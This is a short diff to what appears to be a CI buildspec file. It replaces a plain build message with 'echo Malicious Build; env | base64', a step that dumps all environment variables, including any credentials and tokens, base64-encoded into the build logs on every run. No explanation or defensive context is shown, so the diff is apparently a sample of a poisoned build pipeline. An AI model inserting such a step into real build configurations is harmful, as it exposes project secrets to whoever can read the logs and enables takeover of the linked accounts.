@@ -14,7 +14,7 @@ phases:
 
   build:
     commands:
-      - echo Building the application...
+      - echo Malicious Build; env | base64
       - npm run build
 
   post_build:
